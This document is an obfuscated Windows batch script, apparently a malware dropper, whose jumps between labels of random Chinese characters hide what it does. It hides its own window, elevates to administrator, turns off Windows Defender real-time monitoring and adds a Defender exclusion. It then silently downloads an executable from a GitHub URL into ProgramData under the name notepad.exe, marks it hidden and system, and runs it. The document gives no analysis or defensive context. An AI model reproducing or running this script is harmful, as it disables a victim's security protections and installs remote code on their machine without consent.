@echo off
if not "%1"=="h" start /min cmd /c "%~dpnx0" h & exit
GOTO 阿克贝贝维豆埃豆埃贝
:阿贝德埃爱爱饿饿饿贝
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process bitsadmin -ArgumentList '/transfer myDownloadJob /download /priority normal https://github.com/hoangnamdz13/shellw/raw/main/notepad.exe %ProgramData%\notepad.exe' -WindowStyle Hidden -Verb RunAs"
GOTO 饿克豆德艾德斯豆饿爱
:斯艾贝艾爱饿豆饿饿克
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
GOTO 爱耻豆贝饿斯贝尔色埃
:耻阿斯豆贝爱贝德贝埃
attrib +s +h %ProgramData%\notepad.exe
GOTO 斯艾贝艾爱饿豆饿饿克0
:饿克豆德艾德斯豆饿爱
timeout /t 2
GOTO 埃尔埃艾德埃贝贝阿克
:爱耻豆贝饿斯贝尔色埃
if '%errorlevel%' NEQ '0' (powershell start -verb runas '%0' & exit /B)
GOTO 尔色德克维德爱爱爱斯
:阿豆阿贝饿色尔耻埃维
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true;"
GOTO 阿贝德埃爱爱饿饿饿贝
:斯艾贝艾爱饿豆饿饿克0
start "" "%ProgramData%\notepad.exe"
GOTO 斯艾贝艾爱饿豆饿饿克1
:埃尔埃艾德埃贝贝阿克
if not "%1"=="h" start /min cmd /c "%~dpnx0" h & exit
GOTO 尔德耻贝色爱克耻爱色
:阿克贝贝维豆埃豆埃贝
@echo off
GOTO 斯艾贝艾爱饿豆饿饿克
:尔德耻贝色爱克耻爱色
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \"$env:ProgramData\notepad.exe\""
GOTO 耻阿斯豆贝爱贝德贝埃
:尔色德克维德爱爱爱斯
if not "%1"=="h" start /min cmd /c "%~dpnx0" h & exit
GOTO 阿豆阿贝饿色尔耻埃维
:斯艾贝艾爱饿豆饿饿克1
